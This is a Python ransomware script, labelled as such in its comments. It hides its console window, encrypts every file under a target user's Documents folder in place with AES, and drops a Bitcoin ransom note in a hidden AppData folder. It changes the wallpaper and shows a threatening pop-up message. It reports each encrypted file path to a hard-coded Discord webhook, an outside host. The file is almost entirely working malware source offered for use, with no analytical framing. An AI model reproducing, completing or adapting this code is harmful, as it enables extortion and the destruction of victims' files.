import os
import platform
import time
import shutil
import logging
import http.client
import json
import subprocess
import sys
import ctypes

# Function to hide the command prompt
def hide_console():
    ctypes.windll.kernel32.FreeConsole()

# Function to automatically install the necessary library
def install_library(library_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library_name])
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to install {library_name}: {e}")
        send_to_discord(f"Failed to install {library_name}: {e}")
        exit(1)

# Check if 'cryptography' library is installed, if not install it
try:
    import cryptography
except ImportError:
    logging.info("cryptography library not found, installing...")
    install_library("cryptography")
    import cryptography

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import base64
import random
import string

# Discord Webhook URL (replace with your actual webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1305506982202970139/dS7uIxVPXhLLVQUMwHJOlgtpKqU6wrzpXfNJK9ejOaboy3iJU3zokJz5DlBdOewBAbPl'

# Set up logging to track script activities
logging.basicConfig(filename="script_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# Function to send messages to Discord webhook using http.client
def send_to_discord(message):
    try:
        # Extract the hostname and path from the webhook URL
        url_parts = WEBHOOK_URL.replace("https://", "").split("/", 1)
        hostname = url_parts[0]
        path = "/" + url_parts[1]

        # Prepare the data to send (content of the message)
        data = json.dumps({
            "content": message
        })

        # Set up the connection and headers
        connection = http.client.HTTPSConnection(hostname)
        headers = {'Content-Type': 'application/json'}

        # Send the POST request
        connection.request("POST", path, body=data, headers=headers)

        # Get the response and check if it's successful
        response = connection.getresponse()
        if response.status == 204:
            logging.info(f"Successfully sent message to Discord: {message}")
        else:
            logging.error(f"Failed to send message to Discord. Status code: {response.status}")

        # Close the connection
        connection.close()

    except Exception as e:
        logging.error(f"Error sending message to Discord: {e}")

# Function to generate a strong encryption key and IV for AES encryption
def generate_aes_key_iv():
    key = os.urandom(32)  # 256-bit key
    iv = os.urandom(16)   # 128-bit IV
    return key, iv

# Encrypt data using AES encryption
def aes_encrypt(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padded_data = data + b'\0' * (16 - len(data) % 16)  # Padding to block size
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

# Decrypt data using AES encryption
def aes_decrypt(encrypted_data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    return decrypted_data.rstrip(b'\0')  # Remove padding

# Function to generate RSA public and private keys for encrypting the AES key
def generate_rsa_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

# Function to encrypt AES key using RSA public key
def encrypt_aes_key_rsa(aes_key, rsa_public_key):
    encrypted_aes_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_aes_key

# Function to generate a ransom note
def create_ransom_note():
    ransom_note = """
    All your files have been encrypted!
    To get your files back, send Bitcoin to the following address:
    [Bitcoin Address]
    After payment, you will receive the decryption key.
    """
    return ransom_note

# Encrypt all files in a directory
def encrypt_files_in_directory(directory, aes_key, aes_iv):
    for root, dirs, files in os.walk(directory, topdown=False):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()

                encrypted_data = aes_encrypt(file_data, aes_key, aes_iv)

                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)

                logging.info(f"Successfully encrypted {file_path}")
                send_to_discord(f"Encrypted file: {file_path}")
            except Exception as e:
                logging.error(f"Failed to encrypt {file_path}: {e}")
                send_to_discord(f"Failed to encrypt {file_path}: {e}")

# Hide ransom note in a hidden folder
def hide_ransom_note():
    local_appdata_path = os.getenv('LOCALAPPDATA')
    ransom_folder_path = os.path.join(local_appdata_path, 'HiddenRansomFiles')

    os.makedirs(ransom_folder_path, exist_ok=True)

    ransom_note = create_ransom_note()

    with open(os.path.join(ransom_folder_path, 'ransom_note.txt'), 'w') as f:
        f.write(ransom_note)

    logging.info("Ransom note created and hidden.")
    send_to_discord("Ransom note hidden successfully.")

# Function to change wallpaper (Windows)
def change_wallpaper(image_path):
    try:
        if platform.system() == 'Windows':
            os.system(f"reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d {image_path} /f")
            os.system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")
        elif platform.system() == 'Darwin':
            os.system(f"osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"{image_path}\"'")
        elif platform.system() == 'Linux':
            os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{image_path}")
    except Exception as e:
        logging.error(f"Failed to change wallpaper: {e}")

# Function to play scary sound (Windows)
def play_scary_sound(sound_file):
    try:
        if platform.system() == 'Windows':
            os.system(f"start {sound_file}")
    except Exception as e:
        logging.error(f"Failed to play sound: {e}")

# Function to show scary text (Windows)
def show_scary_text():
    try:
        if platform.system() == 'Windows':
            os.system('msg * "YOU HAVE BEEN CURSED. PAY NOW OR FACE THE CONSEQUENCES."')
    except Exception as e:
        logging.error(f"Failed to show scary text: {e}")

# Main ransomware logic
def main():
    # Hide the command prompt window
    hide_console()

    # Generate RSA keys for encryption
    private_key, public_key = generate_rsa_keys()

    # Generate AES key and IV
    aes_key, aes_iv = generate_aes_key_iv()

    # Encrypt the AES key using RSA public key
    encrypted_aes_key = encrypt_aes_key_rsa(aes_key, public_key)

    # Encrypt files in the target directory
    target_directory = r"C:\Users\Target\Documents"  # Update as needed
    encrypt_files_in_directory(target_directory, aes_key, aes_iv)

    # Hide the ransom note
    hide_ransom_note()

    # Change wallpaper, play sound, and show text
    change_wallpaper("path_to_wallpaper.jpg")
    time.sleep(1)  # Small delay before playing the sound
    play_scary_sound("path_to_sound.mp3")
    time.sleep(1)  # Small delay before showing the text
    show_scary_text()

    # Send completion message
    send_to_discord("Ransomware executed successfully.")

# Run the main function
if __name__ == "__main__":
    main()